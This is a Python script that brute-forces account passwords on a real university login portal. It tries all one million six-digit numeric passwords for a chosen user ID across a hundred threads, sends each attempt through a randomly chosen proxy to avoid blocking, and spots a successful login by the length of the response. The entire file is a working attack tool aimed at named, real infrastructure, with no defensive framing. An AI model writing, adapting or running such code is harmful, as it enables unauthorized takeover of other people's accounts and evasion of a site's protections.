import requests
from threading import Thread, Lock
import json
import random
from time import sleep
from TaskManager.TaskManager import task_partition, task_manager

lock = Lock()
Done = False
base_url = 'http://urp.ecust.edu.cn/userPasswordValidate.portal'
proxy_list = []
UserID = ''
UserPwd = 0

OnRun = {'timeout': 2, 'sleep': 0}
ThreadStatus = dict()


def decoder(tid: int, uid: str, pwd_start_pos: int, pwd_end_pos: int):
    global UserPwd
    global Done

    data = {
        'Login.Token1': uid,
        'Login.Token2': '',
        'goto': 'http://urp.ecust.edu.cn/loginSuccess.portal',
        'gotoOnFail': 'http://urp.ecust.edu.cn/loginFailure.portal'
    }

    pwd = pwd_start_pos
    while pwd < pwd_end_pos:
        sleep(OnRun['sleep'])
        if Done:
            break

        data['Login.Token2'] = '%06d' % pwd
        try:
            r = requests.get(base_url, data, proxies=random.choice(proxy_list),
                             timeout=OnRun['timeout']).text
        except requests.exceptions.RequestException:
            continue

        if len(r) != 99 and len(r) != 83:
            continue

        if len(r) == 83:
            with lock:
                Done = True
                UserPwd = pwd
            break

        with lock:
            ThreadStatus[tid] = (pwd - pwd_start_pos) / (pwd_end_pos - pwd_start_pos)
        pwd += 1
    with lock:
        ThreadStatus[tid] = 1.0


if __name__ == '__main__':
    with open('../ProxyFetcher/res/proxy.txt', 'r') as f:
        proxy_list = [dict(http=url) for url in json.load(f)]

    uid = UserID
    partitions = task_partition(0, 1000000, 100)  # 131000, 132000
    total_threads = len(partitions)

    threads = []
    for tid in range(total_threads):
        threads.append(Thread(target=decoder, args=(tid, uid, partitions[tid][0], partitions[tid][1],)))
    threads.append(Thread(target=task_manager, args=(total_threads, lock, ThreadStatus, OnRun)))

    for t in threads:
        t.start()
    for t in threads:
        t.join()
    if Done:
        print('User id: %s\tUser password: %06d' % (uid, UserPwd))
    else:
        print('Failed')
